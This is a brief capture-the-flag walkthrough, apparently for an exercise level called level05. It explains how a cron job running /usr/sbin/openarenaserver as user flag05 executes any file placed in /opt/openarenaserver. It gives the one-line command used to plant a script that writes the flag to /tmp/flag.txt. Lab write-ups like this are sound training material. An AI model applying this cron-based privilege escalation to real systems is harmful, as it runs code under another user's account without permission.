In the ENV variables there is an unusual line:

MAIL=/var/mail/level05

This file is a cron job that runs openarenaserver as flag05:

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

The file /usr/sbin.openarenaserver is a bash script. There is a loop that tries to execute every file in /opt/openarenaserver:

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

We added a script that calls:

echo "/bin/getflag > /tmp/flag.txt" > /opt/openarenaserver/flag.sh

Every 2nd minute this script runs and sends the flag to /tmp/flag.txt. There is no password for flag05.
